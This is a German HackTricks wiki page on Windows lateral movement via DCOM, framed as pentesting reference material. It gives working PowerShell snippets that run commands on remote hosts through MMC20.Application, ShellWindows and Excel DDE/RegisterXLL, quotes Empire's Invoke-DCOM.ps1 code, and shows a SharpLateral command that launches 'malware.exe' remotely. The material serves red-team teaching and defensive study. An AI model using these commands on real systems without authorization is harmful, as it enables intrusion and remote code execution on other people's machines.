# DCOM Exec

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null bis Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersecurity-Unternehmen**? Möchten Sie, dass Ihr **Unternehmen in HackTricks beworben wird**? Oder möchten Sie Zugang zur **neueste Version von PEASS oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**Die PEASS-Familie**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich die [**offiziellen PEASS & HackTricks Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repo**](https://github.com/carlospolop/hacktricks) **und** [**hacktricks-cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **einreichen**.

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Für weitere Informationen zu dieser Technik überprüfen Sie den Originalbeitrag von [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Das Distributed Component Object Model (DCOM) bietet eine interessante Möglichkeit für netzwerkbasierte Interaktionen mit Objekten. Microsoft stellt umfassende Dokumentation sowohl für DCOM als auch für das Component Object Model (COM) zur Verfügung, die [hier für DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) und [hier für COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) zugänglich ist. Eine Liste von DCOM-Anwendungen kann mit dem PowerShell-Befehl abgerufen werden:
```bash
Get-CimInstance Win32_DCOMApplication
```
Das COM-Objekt, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), ermöglicht das Scripting von MMC-Snap-In-Operationen. Bemerkenswerterweise enthält dieses Objekt eine `ExecuteShellCommand`-Methode unter `Document.ActiveView`. Weitere Informationen zu dieser Methode finden Sie [hier](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Überprüfen Sie es in Aktion:

Diese Funktion erleichtert die Ausführung von Befehlen über ein Netzwerk durch eine DCOM-Anwendung. Um remote als Admin mit DCOM zu interagieren, kann PowerShell wie folgt verwendet werden:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Dieser Befehl verbindet sich mit der DCOM-Anwendung und gibt eine Instanz des COM-Objekts zurück. Die ExecuteShellCommand-Methode kann dann aufgerufen werden, um einen Prozess auf dem Remote-Host auszuführen. Der Prozess umfasst die folgenden Schritte:

Check methods:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE erhalten:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Für weitere Informationen zu dieser Technik siehe den ursprünglichen Beitrag [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Das **MMC20.Application**-Objekt wurde als mangelhaft in Bezug auf explizite "LaunchPermissions" identifiziert, was zu Berechtigungen führt, die Administratoren den Zugriff erlauben. Für weitere Details kann ein Thread [hier](https://twitter.com/tiraniddo/status/817532039771525120) erkundet werden, und die Verwendung von [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET zum Filtern von Objekten ohne explizite Launch Permission wird empfohlen.

Zwei spezifische Objekte, `ShellBrowserWindow` und `ShellWindows`, wurden aufgrund ihres Fehlens an expliziten Launch Permissions hervorgehoben. Das Fehlen eines `LaunchPermission`-Registry-Eintrags unter `HKCR:\AppID\{guid}` bedeutet, dass keine expliziten Berechtigungen vorhanden sind.

###  ShellWindows
Für `ShellWindows`, das keinen ProgID hat, ermöglichen die .NET-Methoden `Type.GetTypeFromCLSID` und `Activator.CreateInstance` die Instanziierung des Objekts unter Verwendung seiner AppID. Dieser Prozess nutzt OleView .NET, um die CLSID für `ShellWindows` abzurufen. Nach der Instanziierung ist die Interaktion über die Methode `WindowsShell.Item` möglich, was zu Methodenaufrufen wie `Document.Application.ShellExecute` führt.

Beispiel-PowerShell-Befehle wurden bereitgestellt, um das Objekt zu instanziieren und Befehle remote auszuführen:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Laterale Bewegung mit Excel DCOM-Objekten

Laterale Bewegung kann durch das Ausnutzen von DCOM Excel-Objekten erreicht werden. Für detaillierte Informationen ist es ratsam, die Diskussion über die Nutzung von Excel DDE für laterale Bewegung über DCOM auf [Cybereason's Blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) zu lesen.

Das Empire-Projekt bietet ein PowerShell-Skript, das die Nutzung von Excel für Remote Code Execution (RCE) durch Manipulation von DCOM-Objekten demonstriert. Nachfolgend sind Ausschnitte aus dem Skript verfügbar auf [Empire's GitHub-Repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), die verschiedene Methoden zur Missbrauch von Excel für RCE zeigen:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Automatisierungstools für laterale Bewegung

Zwei Tools werden hervorgehoben, um diese Techniken zu automatisieren:

- **Invoke-DCOM.ps1**: Ein PowerShell-Skript, das vom Empire-Projekt bereitgestellt wird und die Ausführung verschiedener Methoden zum Ausführen von Code auf Remote-Maschinen vereinfacht. Dieses Skript ist im Empire GitHub-Repository verfügbar.

- **SharpLateral**: Ein Tool, das zum Ausführen von Code aus der Ferne entwickelt wurde und mit dem Befehl verwendet werden kann:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Automatische Werkzeuge

* Das Powershell-Skript [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) ermöglicht es, alle kommentierten Methoden zum Ausführen von Code auf anderen Maschinen einfach aufzurufen.
* Sie könnten auch [**SharpLateral**](https://github.com/mertdas/SharpLateral) verwenden:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referenzen

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos sendest.

</details>
{% endhint %}
